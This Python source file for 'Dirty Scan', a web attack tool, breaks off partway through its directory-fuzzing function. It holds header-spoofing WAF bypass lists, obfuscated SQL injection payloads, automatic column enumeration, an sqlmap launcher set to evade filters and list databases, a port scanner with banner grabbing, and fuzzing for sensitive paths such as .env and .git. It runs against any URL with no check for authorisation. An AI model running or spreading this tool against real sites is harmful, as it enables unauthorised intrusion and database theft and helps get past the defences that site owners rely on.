#!/usr/bin/env python3

import os
import sys
import subprocess
import platform
import json
import time
import random
import re
import socket
import ssl
import threading
import queue
import urllib.parse
import urllib.request
import urllib.error
import http.client
import shutil
import signal
import tempfile
from datetime import datetime
from pathlib import Path

# ============================================================
# DIRTY SCAN - Automated Web Security Scanner with WAF Bypass
# Created by Strozzz
# Version 1.0.0
# ============================================================

# ---------- Color Definitions ----------
GREEN = '\033[0;32m'
RED = '\033[0;31m'
YELLOW = '\033[1;33m'
CYAN = '\033[0;36m'
BLUE = '\033[0;34m'
MAGENTA = '\033[0;35m'
BOLD = '\033[1m'
NC = '\033[0m'

# ---------- Global Configuration ----------
VERSION = "1.0.0"
AUTHOR = "Strozzz"
TOOL_NAME = "Dirty Scan"

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 OPR/111.0.0.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:126.0) Gecko/20100101 Firefox/126.0",
    "Mozilla/5.0 (iPad; CPU OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0",
    "Mozilla/5.0 (Windows NT 10.0; rv:126.0) Gecko/20100101 Firefox/126.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Android 14; Mobile; rv:126.0) Gecko/20100101 Firefox/126.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Whale/3.27.0.0 Safari/537.36",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)"
]

WAF_SIGNATURES = {
    "Cloudflare": {"headers": ["cf-ray", "cf-cache-status", "__cfduid"], "body": ["cloudflare-nginx", "CloudFlare"]},
    "ModSecurity": {"headers": ["x-mod-security"], "body": ["Mod Security", "ModSecurity"]},
    "Sucuri": {"headers": ["x-sucuri-id", "x-sucuri-cache"], "body": ["Sucuri", "cloudproxy"]},
    "Akamai": {"headers": ["x-akamai-transformed"], "body": ["akamai"]},
    "AWS WAF": {"headers": ["x-amzn-RequestId", "x-amzn-ErrorType"], "body": ["AWS WAF"]},
    "F5 BIG-IP": {"headers": ["x-application-context"], "body": ["BigIP"]},
    "Barracuda": {"headers": ["x-barracuda"], "body": ["Barracuda"]},
    "Imperva/Incapsula": {"headers": ["x-iinfo", "x-cdn"], "body": ["incapsula", "Imperva"]},
    "Wordfence": {"headers": [], "body": ["Wordfence"]},
    "Comodo": {"headers": ["x-cfwaf"], "body": ["Comodo"]},
    "Radware": {"headers": ["x-request-id"], "body": ["Radware"]},
    "StackPath": {"headers": ["x-aspnet-version"], "body": ["StackPath"]},
    "Varnish": {"headers": ["x-varnish", "via"], "body": ["varnish"]},
    "Naxsi": {"headers": [], "body": ["naxsi"]},
    "SafeLine": {"headers": ["x-sl-request-id"], "body": ["safeline"]},
    "WebKnight": {"headers": [], "body": ["WebKnight"]},
    "Fortinet FortiWeb": {"headers": ["x-fortiweb"], "body": ["FortiWeb"]},
    "Citrix NetScaler": {"headers": ["x-netscaler-connection"], "body": ["NetScaler"]}
}

COMMON_PORTS = [21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 445, 993, 995, 1433, 1521, 2049, 3306, 3389, 5432, 5900, 5985, 5986, 6379, 8080, 8443, 9000, 9090, 10000]

SQL_ERROR_PATTERNS = [
    r"SQL syntax.*MySQL", r"Warning.*mysql_.*", r"MySQLSyntaxErrorException",
    r"valid MySQL result", r"check the manual that corresponds to your MySQL server version",
    r"PostgreSQL.*ERROR", r"Warning.*\Wpg_.*", r"valid PostgreSQL result",
    r"Microsoft OLE DB Provider for ODBC Drivers", r"Microsoft OLE DB Provider for SQL Server",
    r"Driver.* SQL Server", r"DB2 SQL error",
    r"\[SQL Server\]", r"Unclosed quotation mark",
    r"ORA-[0-9]{5}", r"Oracle.*Driver", r"oracle\.jdbc",
    r"SQLite/JDBCDriver", r"SQLite.Exception", r"System.Data.SQLite.SQLiteException",
    r"SQLite3::SQLException",
    r'Macromedia.*SQL', r"CFQUERY", r"ColdFusion",
    r"index.*corrupt", r"Syntax error in query",
    r"Division by zero", r"Column count doesn't match",
    r"Unknown column", r"Table .* doesn't exist",
    r"SQLSTATE", r"Invalid query",
    r"supplied argument is not a valid MySQL", r"mysql_fetch_array",
    r"on MySQL result index", r"mysql_numrows",
    r"mysql_num_rows", r"mysql_connect",
    r"mysql_pconnect", r"query failed",
    r"Warning: mssql_", r"MSSQL",
    r"Procedure .* expects parameter", r"Server Error in '/' Application"
]

WAF_BYPASS_HEADERS = [
    {"X-Originating-IP": "127.0.0.1"},
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Remote-IP": "127.0.0.1"},
    {"X-Remote-Addr": "127.0.0.1"},
    {"X-Client-IP": "127.0.0.1"},
    {"X-Host": "127.0.0.1"},
    {"X-Forwarded-Host": "127.0.0.1"},
    {"Client-IP": "127.0.0.1"},
    {"True-Client-IP": "127.0.0.1"},
    {"X-Real-IP": "127.0.0.1"},
    {"X-Original-URL": "/"},
    {"X-Rewrite-URL": "/"},
    {"X-Forwarded-For": "127.0.0.1, 127.0.0.1"},
    {"X-Originating-IP": "[::1]"},
    {"X-Forwarded-For": "localhost"},
    {"X-Forwarded-For": "2130706433"},
    {"X-Forwarded-For": "0x7f000001"},
    {"Content-Type": "application/x-www-form-urlencoded; charset=ibm037"},
    {"Accept": "*/*"},
    {"Accept-Language": "en-US,en;q=0.9"},
    {"Cache-Control": "no-cache"},
    {"Pragma": "no-cache"},
    {"Upgrade-Insecure-Requests": "1"}
]

WAF_BYPASS_PAYLOADS_SQLI = [
    "' OR '1'='1",
    "' OR '1'='1' -- -",
    "' OR '1'='1' #",
    "' OR 1=1 -- -",
    "\" OR \"1\"=\"1",
    "' UNION SELECT NULL-- -",
    "' UNION SELECT NULL,NULL-- -",
    "' UNION SELECT NULL,NULL,NULL-- -",
    "1' ORDER BY 1-- -",
    "1' ORDER BY 2-- -",
    "1' ORDER BY 3-- -",
    "1' ORDER BY 4-- -",
    "1' ORDER BY 5-- -",
    "1' GROUP BY 1-- -",
    "1' GROUP BY 2-- -",
    "1' GROUP BY 3-- -",
    "' AND 1=1-- -",
    "' AND 1=2-- -",
    "1' AND '1'='1",
    "1' AND '1'='2",
    "1'/**/ORDER/**/BY/**/1-- -",
    "1'/*!ORDER BY*/1-- -",
    "' UN/**/ION SEL/**/ECT 1,2,3-- -",
    "'+UNION+SELECT+1,2,3-- -",
    "'%09UNION%09SELECT%091,2,3-- -",
    "'/*!00000UNION*//*!00000SELECT*/1,2,3-- -",
    "' UNION ALL SELECT NULL,NULL,NULL-- -",
    "' UNION DISTINCT SELECT NULL,NULL,NULL-- -",
    "1' AND SLEEP(5)-- -",
    "1' AND BENCHMARK(5000000,MD5('test'))-- -",
    "' OR 'a'='a'",
    "')) OR (('1'='1",
    "1' HAVING 1=1-- -",
    "'/**/UNION/**/ALL/**/SELECT/**/NULL,NULL,NULL-- -",
    "1' ORDER BY 1/*",
    "1' ORDER BY 1--",
    "1' ORDER BY 1#",
    "1' AND 1=1 AND '%'='",
    "1' AND 1=1 UNION SELECT 1,2,3-- -"
]

# ============================================================
# BANNER
# ============================================================

def show_banner():
    os.system('clear' if os.name == 'posix' else 'cls')
    print(f"{RED}")
    banner_lines = [
        "______ _      _          _____                  ",
        "|  _  \(_)    | |        /  ___|                 ",
        "| | | | _ _ __| |_ _   _ \ `--.  ___  __ _ _ __  ",
        "| | | || | '__| __| | | | `--. \/ __|/ _` | '_ \ ",
        "| |/ / | | |  | |_| |_| |/\__/ / (__| (_| | | | |",
        "|___/  |_|_|   \__|\__, |\____/ \___|\__,_|_| |_|",
        "                    __/ |                        ",
        "                   |___/                         "
    ]
    for line in banner_lines:
        print(f"{RED}{line}{NC}")
    print(f"{YELLOW}  [+] Created by: {AUTHOR}{NC}")
    print(f"{YELLOW}  [+] Version   : {VERSION}{NC}")
    print(f"{YELLOW}  [+] Tool      : {TOOL_NAME}{NC}")
    print(f"{GREEN}  [+] Status    : Ready for scanning...{NC}")
    print()

# ============================================================
# UTILITY FUNCTIONS
# ============================================================

def print_info(msg):
    print(f"{CYAN}[I] {msg}{NC}")

def print_good(msg):
    print(f"{GREEN}[+] {msg}{NC}")

def print_warn(msg):
    print(f"{YELLOW}[!] {msg}{NC}")

def print_error(msg):
    print(f"{RED}[-] {msg}{NC}")

def print_section(title):
    width = 65
    print(f"\n{BLUE}{'='*width}{NC}")
    print(f"{BLUE}| {title:<{width-3}}|{NC}")
    print(f"{BLUE}{'='*width}{NC}")

def get_random_ua():
    return random.choice(USER_AGENTS)

def is_url_alive(url, timeout=10):
    try:
        req = urllib.request.Request(url, headers={"User-Agent": get_random_ua()})
        resp = urllib.request.urlopen(req, timeout=timeout)
        return resp.getcode()
    except:
        return None

def extract_domain(url):
    parsed = urllib.parse.urlparse(url)
    return parsed.netloc or parsed.path.split("/")[0]

# ============================================================
# REQUIREMENTS INSTALLATION
# ============================================================

def check_install_requirements():
    print_section(" Checking Requirements ")
    required_pkgs = ["requests", "colorama"]

    # Find the correct pip
    pip_paths = [
        shutil.which("pip"),
        shutil.which("pip3"),
        "/data/data/com.termux/files/usr/bin/pip",
        "/data/data/com.termux/files/usr/bin/pip3",
        "/usr/bin/pip",
        "/usr/bin/pip3"
    ]

    pip_cmd = None
    for p in pip_paths:
        if p and os.path.exists(p):
            pip_cmd = p
            break

    if not pip_cmd:
        # Fallback: try python -m pip
        pip_cmd = [sys.executable, "-m", "pip"]

    for pkg in required_pkgs:
        try:
            __import__(pkg.replace("-", "_"))
            print_good(f"{pkg} already installed")
        except ImportError:
            print_info(f"Installing {pkg}...")
            try:
                if isinstance(pip_cmd, list):
                    subprocess.check_call(pip_cmd + ["install", pkg, "-q"])
                else:
                    subprocess.check_call([pip_cmd, "install", pkg, "-q"])
                print_good(f"{pkg} installed successfully")
            except Exception as e:
                print_warn(f"Could not install {pkg}: {str(e)}")
                print_info("Please run: pip install " + pkg)

    sqlmap_path = shutil.which("sqlmap")
    if sqlmap_path:
        print_good(f"sqlmap found at {sqlmap_path}")
    else:
        print_warn("sqlmap not found. SQL injection will use internal methods.")

    nmap_path = shutil.which("nmap")
    if nmap_path:
        print_good(f"nmap found at {nmap_path}")
    else:
        print_warn("nmap not found. Port scanning will use Python socket methods.")

    print()
    
    # Check if sqlmap is available
    sqlmap_path = shutil.which("sqlmap")
    if sqlmap_path:
        print_good(f"sqlmap found at {sqlmap_path}")
    else:
        print_warn("sqlmap not found in PATH. SQL injection module will use internal methods.")
        print_info("To install sqlmap: apt install sqlmap (Linux/Termux) or git clone https://github.com/sqlmapproject/sqlmap.git")
    
    # Check for nmap
    nmap_path = shutil.which("nmap")
    if nmap_path:
        print_good(f"nmap found at {nmap_path}")
    else:
        print_warn("nmap not found. Port scanning will use Python socket methods.")
    
    print()

# ============================================================
# WAF DETECTION MODULE
# ============================================================

def detect_waf(url):
    print_section(" WAF Detection ")
    print_info(f"Target: {url}")
    
    detected_wafs = []
    
    try:
        req = urllib.request.Request(url, headers={"User-Agent": get_random_ua()})
        resp = urllib.request.urlopen(req, timeout=15)
        headers = dict(resp.headers)
        body = resp.read().decode('utf-8', errors='ignore').lower()
        
        # Check headers for WAF signatures
        for waf_name, sigs in WAF_SIGNATURES.items():
            found = False
            for h in sigs["headers"]:
                if h.lower() in [k.lower() for k in headers.keys()]:
                    found = True
                    break
            if not found:
                for b_pattern in sigs["body"]:
                    if b_pattern.lower() in body:
                        found = True
                        break
            if found:
                detected_wafs.append(waf_name)
                print_good(f"WAF Detected: {waf_name}")
        
        # Send malicious test payload to trigger WAF
        test_url = url + ("?" if "?" not in url else "&") + "id=1' UNION SELECT * FROM users--"
        malicious_req = urllib.request.Request(
            test_url,
            headers={"User-Agent": get_random_ua()}
        )
        try:
            malicious_resp = urllib.request.urlopen(malicious_req, timeout=10)
            if malicious_resp.getcode() in [403, 406, 429, 503]:
                if not detected_wafs:
                    detected_wafs.append("Unknown WAF (blocked malicious payload)")
                    print_good(f"WAF Detected: Unknown WAF (blocked malicious payload)")
        except urllib.error.HTTPError as e:
            if e.code in [403, 406, 429, 503]:
                if not detected_wafs:
                    detected_wafs.append("Unknown WAF")
                    print_good(f"WAF Detected: Unknown WAF (HTTP {e.code})")
                else:
                    print_info(f"WAF triggered: HTTP {e.code}")
        except:
            pass
        
        if not detected_wafs:
            print_info("No WAF detected")
            return None
        else:
            return detected_wafs
            
    except Exception as e:
        print_error(f"Error detecting WAF: {str(e)}")
        return None

# ============================================================
# WAF BYPASS MODULE
# ============================================================

def waf_bypass_scan(url):
    print_section(" WAF Bypass Scan ")
    
    if "?" not in url:
        print_warn("No query parameters found for bypass testing")
        return False
    
    print_info("Testing WAF bypass techniques...")
    bypass_found = False
    
    for idx, bypass_header in enumerate(WAF_BYPASS_HEADERS):
        ua = get_random_ua()
        headers = {"User-Agent": ua}
        headers.update(bypass_header)
        
        # Test with malicious payload
        test_url = url + ("'" if "?" in url else "?id=1'")
        
        try:
            req = urllib.request.Request(test_url, headers=headers)
            resp = urllib.request.urlopen(req, timeout=10)
            code = resp.getcode()
            body = resp.read().decode('utf-8', errors='ignore')
            
            # Check if we got through (200 instead of 403/406/503)
            if code == 200:
                # Check for SQL errors to confirm bypass worked
                for pattern in SQL_ERROR_PATTERNS:
                    if re.search(pattern, body, re.IGNORECASE):
                        bypass_found = True
                        print_good(f"Bypass successful with header: {list(bypass_header.keys())[0]}")
                        break
                        
        except urllib.error.HTTPError as e:
            if e.code not in [403, 406, 429, 503]:
                bypass_found = True
                print_good(f"Partial bypass with header: {list(bypass_header.keys())[0]} (HTTP {e.code})")
        except:
            pass
    
    if not bypass_found:
        # Try User-Agent rotation bypass
        print_info("Trying User-Agent rotation bypass...")
        for ua in random.sample(USER_AGENTS, min(10, len(USER_AGENTS))):
            test_url = url + ("'" if "?" in url else "?id=1'")
            try:
                req = urllib.request.Request(test_url, headers={"User-Agent": ua})
                resp = urllib.request.urlopen(req, timeout=10)
                if resp.getcode() == 200:
                    body = resp.read().decode('utf-8', errors='ignore')
                    for pattern in SQL_ERROR_PATTERNS:
                        if re.search(pattern, body, re.IGNORECASE):
                            bypass_found = True
                            print_good(f"Bypass successful with User-Agent: {ua[:50]}...")
                            break
                    if bypass_found:
                        break
            except:
                continue
    
    if not bypass_found:
        # Try payload encoding bypass
        print_info("Trying encoded payload bypass...")
        encoded_payloads = [
            url + "'%20OR%20'1'%3D'1",
            url + "'%20OR%201%3D1--%20-",
            url + "'%20UNION%20SELECT%20NULL%2CNULL--%20-",
            url + "'/**/OR/**/'x'='x",
            url + "'%0AOR%0A'1'%3D'1",
            url + "'/*!50000OR*/'1'='1",
        ]
        for ep in encoded_payloads:
            try:
                req = urllib.request.Request(ep, headers={"User-Agent": get_random_ua()})
                resp = urllib.request.urlopen(req, timeout=10)
                if resp.getcode() == 200:
                    body = resp.read().decode('utf-8', errors='ignore')
                    for pattern in SQL_ERROR_PATTERNS:
                        if re.search(pattern, body, re.IGNORECASE):
                            bypass_found = True
                            print_good(f"Bypass with encoded payload: {ep[-30:]}")
                            break
                    if bypass_found:
                        break
            except:
                continue
    
    if bypass_found:
        print_good("WAF bypass successful!")
    else:
        print_warn("WAF bypass not successful with current techniques")
    
    return bypass_found

# ============================================================
# AUTOMATIC COLUMN DETECTION
# ============================================================

def detect_columns(url):
    print_section(" Column Detection ")
    
    if "?" not in url:
        print_warn("No parameters found for column detection")
        return None, []
    
    base_url = url.split("?")[0]
    params = url.split("?")[1] if "?" in url else ""
    
    print_info("Detecting number of columns using ORDER BY technique...")
    
    max_columns = 0
    vulnerable_params = []
    
    # Try each parameter
    param_pairs = []
    if "&" in params:
        for p in params.split("&"):
            key = p.split("=")[0] if "=" in p else p
            param_pairs.append(key)
    else:
        key = params.split("=")[0] if "=" in params else params
        param_pairs.append(key)
    
    for param in param_pairs:
        print_info(f"Testing parameter: {param}")
        for cols in range(1, 51):
            test_url = f"{base_url}?{param}=1' ORDER BY {cols}-- -"
            try:
                req = urllib.request.Request(test_url, headers={"User-Agent": get_random_ua()})
                resp = urllib.request.urlopen(req, timeout=10)
                body = resp.read().decode('utf-8', errors='ignore')
                
                # Check for error indicating wrong column count
                if re.search(r"Unknown column|order by|ORDER BY", body, re.IGNORECASE) or "error" in body.lower():
                    # This column count failed, so previous one is max
                    max_columns = cols - 1
                    break
                else:
                    max_columns = cols
                    
            except urllib.error.HTTPError as e:
                if e.code in [500, 404]:
                    max_columns = cols - 1
                    break
                elif e.code in [403, 406, 503]:
                    print_warn(f"WAF blocked request at column {cols}, trying bypass...")
                    # Try with bypass headers
                    bypass_found = False
                    for bh in random.sample(WAF_BYPASS_HEADERS, 5):
                        h = {"User-Agent": get_random_ua()}
                        h.update(bh)
                        try:
                            req2 = urllib.request.Request(test_url, headers=h)
                            resp2 = urllib.request.urlopen(req2, timeout=10)
                            body2 = resp2.read().decode('utf-8', errors='ignore')
                            if re.search(r"Unknown column|order by", body2, re.IGNORECASE):
                                max_columns = cols - 1
                                bypass_found = True
                                break
                            else:
                                max_columns = cols
                                bypass_found = True
                                break
                        except:
                            continue
                    if not bypass_found:
                        print_warn("Could not bypass WAF for column detection")
                        break
                else:
                    max_columns = cols - 1
                    break
            except:
                max_columns = cols - 1
                break
        
        if max_columns > 0:
            vulnerable_params.append(param)
            print_good(f"Parameter '{param}' has {max_columns} columns")
    
    if max_columns == 0:
        # Try UNION SELECT NULL technique
        print_info("Trying UNION SELECT NULL technique...")
        for param in param_pairs:
            for cols in range(1, 21):
                nulls = ",".join(["NULL"] * cols)
                test_url = f"{base_url}?{param}=1' UNION SELECT {nulls}-- -"
                try:
                    req = urllib.request.Request(test_url, headers={"User-Agent": get_random_ua()})
                    resp = urllib.request.urlopen(req, timeout=10)
                    body = resp.read().decode('utf-8', errors='ignore')
                    if "Column count doesn't match" not in body and "has the same number of columns" not in body:
                        max_columns = cols
                        vulnerable_params.append(param)
                        print_good(f"Parameter '{param}' has {max_columns} columns (UNION technique)")
                        break
                except:
                    continue
            if max_columns > 0:
                break
    
    if max_columns == 0:
        print_warn("Could not detect column count automatically")
        return None, []
    
    print_good(f"Maximum columns detected: {max_columns}")
    return max_columns, vulnerable_params

# ============================================================
# SQL INJECTION MODULE
# ============================================================

def sql_injection_scan(url):
    print_section(" SQL Injection Scan ")
    
    if "?" not in url:
        print_warn("No parameters to test for SQL injection")
        return
    
    base_url = url.split("?")[0]
    params_part = url.split("?")[1] if "?" in url else ""
    params = params_part.split("&") if params_part else []
    
    vulnerable = []
    
    for param in params:
        key = param.split("=")[0] if "=" in param else param
        print_info(f"Testing parameter: {key}")
        
        for payload in WAF_BYPASS_PAYLOADS_SQLI[:15]:  # Test first 15 payloads
            test_url = f"{base_url}?{key}={urllib.parse.quote(payload)}"
            try:
                req = urllib.request.Request(test_url, headers={"User-Agent": get_random_ua()})
                resp = urllib.request.urlopen(req, timeout=10)
                body = resp.read().decode('utf-8', errors='ignore')
                
                for pattern in SQL_ERROR_PATTERNS:
                    if re.search(pattern, body, re.IGNORECASE):
                        vulnerable.append((key, payload, pattern))
                        print_good(f"SQL Injection found in '{key}' with payload: {payload[:40]}")
                        print_good(f"Error pattern: {pattern}")
                        break
                if vulnerable:
                    break
            except urllib.error.HTTPError as e:
                if e.code == 200:
                    try:
                        body = e.read().decode('utf-8', errors='ignore')
                        for pattern in SQL_ERROR_PATTERNS:
                            if re.search(pattern, body, re.IGNORECASE):
                                vulnerable.append((key, payload, pattern))
                                break
                    except:
                        pass
                elif e.code not in [403, 406, 429, 503]:
                    # Might be a WAF block, try bypass
                    pass
            except:
                continue
        
        if not any(v[0] == key for v in vulnerable):
            print_info(f"Parameter '{key}' appears not vulnerable to SQL injection")
    
    if vulnerable:
        print_section(" SQL Injection Results ")
        for v in vulnerable:
            print_good(f"Parameter: {v[0]}")
            print_good(f"Payload: {v[1]}")
            print_good(f"Error: {v[2]}")
            print()
    else:
        print_warn("No SQL injection vulnerabilities detected")
    
    return vulnerable

# ============================================================
# SQLMAP AUTOMATION MODULE
# ============================================================

def run_sqlmap_automation(url):
    print_section(" SQLMap Automation ")
    
    sqlmap_path = shutil.which("sqlmap")
    if not sqlmap_path:
        print_warn("sqlmap not found. Checking if sqlmap.py exists in common locations...")
        common_paths = [
            os.path.expanduser("~/sqlmap/sqlmap.py"),
            "/usr/share/sqlmap/sqlmap.py",
            "/opt/sqlmap/sqlmap.py",
            os.path.expanduser("~/sqlmap-dev/sqlmap.py"),
            "/data/data/com.termux/files/home/sqlmap/sqlmap.py"
        ]
        for sp in common_paths:
            if os.path.exists(sp):
                sqlmap_path = sp
                print_good(f"sqlmap found at {sp}")
                break
    
    if not sqlmap_path:
        print_error("sqlmap not found. Please install sqlmap first.")
        print_info("Install with: apt install sqlmap")
        return
    
    print_info(f"Launching sqlmap against: {url}")
    print_info("Using random User-Agent and tamper scripts for WAF bypass")
    
    # Generate output directory
    output_dir = f"sqlmap_output_{int(time.time())}"
    
    # Build sqlmap command with WAF bypass options
    ua = get_random_ua()
    cmd = [
        sys.executable if sqlmap_path.endswith(".py") else sqlmap_path,
        "-u", url,
        "--batch",
        "--random-agent",
        "--tamper", "between,randomcase,space2comment,space2plus",
        "--level", "3",
        "--risk", "2",
        "--output-dir", output_dir,
        "--threads", "5",
        "--time-sec", "5",
        "--dbs"
    ]
    
    if sqlmap_path.endswith(".py"):
        cmd = [sys.executable, sqlmap_path] + cmd[1:]
    
    print_info(f"Command: {' '.join(cmd)}")
    print_info("Running sqlmap (this may take a while)...")
    
    try:
        process = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            universal_newlines=True
        )
        
        for line in iter(process.stdout.readline, ""):
            line = line.strip()
            if line:
                # Color code important messages
                if "[SUCCESS]" in line or "identified" in line.lower():
                    print_good(f"sqlmap: {line}")
                elif "[WARNING]" in line or "not" in line.lower():
                    print_warn(f"sqlmap: {line}")
                elif "[ERROR]" in line:
                    print_error(f"sqlmap: {line}")
                elif "[INFO]" in line:
                    print_info(f"sqlmap: {line}")
                elif "available databases" in line.lower():
                    print_good(f"sqlmap: {line}")
                else:
                    print(f"  {YELLOW}sqlmap:{NC} {line}")
        
        process.wait()
        if process.returncode == 0:
            print_good("sqlmap scan completed successfully")
        else:
            print_warn(f"sqlmap exited with code {process.returncode}")
            
    except FileNotFoundError:
        print_error("Could not execute sqlmap command")
    except Exception as e:
        print_error(f"Error running sqlmap: {str(e)}")

# ============================================================
# WEB CRAWLING MODULE
# ============================================================

def web_crawl(url, max_pages=30):
    print_section(" Web Crawling ")
    
    visited = set()
    to_visit = [url]
    found_urls = []
    base_domain = extract_domain(url)
    
    while to_visit and len(visited) < max_pages:
        current_url = to_visit.pop(0)
        if current_url in visited:
            continue
        
        visited.add(current_url)
        found_urls.append(current_url)
        print_info(f"Crawling: {current_url}")
        
        try:
            req = urllib.request.Request(
                current_url,
                headers={"User-Agent": get_random_ua()}
            )
            resp = urllib.request.urlopen(req, timeout=10)
            body = resp.read().decode('utf-8', errors='ignore')
            
            # Extract links
            links = re.findall(r'href=[\'"]?([^\'" >]+)', body)
            links += re.findall(r'src=[\'"]?([^\'" >]+)', body)
            links += re.findall(r'action=[\'"]?([^\'" >]+)', body)
            
            for link in links:
                # Normalize URL
                if link.startswith("http"):
                    full_url = link
                elif link.startswith("/"):
                    parsed = urllib.parse.urlparse(url)
                    full_url = f"{parsed.scheme}://{parsed.netloc}{link}"
                elif link.startswith("#"):
                    continue
                else:
                    full_url = urllib.parse.urljoin(current_url, link)
                
                # Filter to same domain
                if extract_domain(full_url) == base_domain:
                    # Remove fragments
                    full_url = full_url.split("#")[0]
                    if full_url not in visited and full_url not in to_visit:
                        to_visit.append(full_url)
                        if len(visited) + len(to_visit) > max_pages * 2:
                            break
            
        except Exception as e:
            print_warn(f"Error crawling {current_url}: {str(e)[:50]}")
    
    print_good(f"Crawled {len(found_urls)} URLs")
    
    # Categorize findings
    print_info("Categorizing found URLs...")
    
    # Find forms
    print_section(" Crawled URLs ")
    for u in found_urls:
        print(f"  {GREEN}[URL]{NC} {u}")
    
    return found_urls

# ============================================================
# PORT SCANNING MODULE
# ============================================================

def scan_ports(target, ports=None, threads=50):
    print_section(" Port Scanning ")
    
    if ports is None:
        ports = COMMON_PORTS
    
    # Check if target is a domain, resolve it
    try:
        ip = socket.gethostbyname(extract_domain(target))
        print_info(f"Resolved to IP: {ip}")
    except:
        ip = extract_domain(target)
        print_warn(f"Could not resolve hostname, using: {ip}")
    
    open_ports = []
    scan_queue = queue.Queue()
    result_queue = queue.Queue()
    
    for port in ports:
        scan_queue.put(port)
    
    def scan_worker():
        while not scan_queue.empty():
            try:
                port = scan_queue.get_nowait()
            except:
                break
            
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                result = sock.connect_ex((ip, port))
                sock.close()
                
                if result == 0:
                    # Try to get service banner
                    service = "unknown"
                    try:
                        service = socket.getservbyport(port)
                    except:
                        pass
                    
                    # Try to fingerprint the service
                    banner = ""
                    try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.settimeout(3)
                        s.connect((ip, port))
                        if port in [80, 8080, 443, 8443]:
                            s.send(b"GET / HTTP/1.0\r\nHost: " + ip.encode() + b"\r\n\r\n")
                        banner = s.recv(1024).decode('utf-8', errors='ignore').strip()[:80]
                        s.close()
                    except:
                        pass
                    
                    result_queue.put((port, service, banner))
            except:
                pass
    
    print_info(f"Scanning {len(ports)} ports on {ip}...")
    
    # Start threads
    thread_list = []
    for _ in range(threads):
        t = threading.Thread(target=scan_worker)
        t.daemon = True
        t.start()
        thread_list.append(t)
    
    for t in thread_list:
        t.join(timeout=30)
    
    # Collect results
    while not result_queue.empty():
        open_ports.append(result_queue.get())
    
    open_ports.sort(key=lambda x: x[0])
    
    if open_ports:
        print_good(f"Found {len(open_ports)} open ports:")
        print(f"  {'PORT':<8} {'SERVICE':<15} {'BANNER'}")
        print(f"  {'-'*8} {'-'*15} {'-'*50}")
        for port, service, banner in open_ports:
            b = banner.replace('\n', ' ').replace('\r', '')[:50] if banner else ""
            print(f"  {GREEN}{port:<8}{NC} {service:<15} {b}")
    else:
        print_warn("No open ports found")
    
    return open_ports

# ============================================================
# DIRECTORY/URL FUZZING MODULE
# ============================================================

COMMON_DIRS = [
    "admin", "login", "wp-admin", "administrator", "backup", "backups",
    "config", "configuration", "css", "js", "images", "img", "uploads",
    "download", "downloads", "api", "v1", "v2", "graphql", "swagger",
    "phpmyadmin", "pma", "sql", "database", "db", "test", "tests",
    "robots.txt", "sitemap.xml", ".git", ".env", "vendor", "node_modules",
    "assets", "static", "public", "private", "secret", "hidden",
    "panel", "cpanel", "whm", "server-status", "server-info",
    "index.php", "index.html", "default.aspx", "web.config",
    "crossdomain.xml", "clientaccesspolicy.xml", "README.md",
    "install", "setup", "register", "signup", "forgot", "reset",
    "profile", "user", "users", "manage", "management",
    "shell", "cmd", "exec", "console", "terminal", "ssh",
    "mail", "email", "contact", "about", "help", "status",
    "search", "results", "ajax", "includes", "classes", "lib",
    "tmp", "temp", "log", "logs", "error", "errors", "404",
    "proxy", "proxy.php", "proxy.jsp", "redirect", "out",
    "cgi-bin", "cgi", "htdocs", "httpdocs", "webdav", "dav"
]

def fuzz_directories(url):
    print_section(" Directory Fuzzing ")
    
    base_url = f"{url.rstrip('/')}/" if "?" not in url else url.split("?")[0].rstrip("/") + "/"
    found = []
    
    print_info(f"Fuzzing {len(COMMON_DIRS)} common paths...")
    
    for directory in COMMON_DIRS:
        test_url = base_url + directory
        try:
            req = urllib.request.Request(test_url, headers={"User-Agent": get_random_ua()})
            resp = urllib.request.urlopen(req, timeout=8)
            
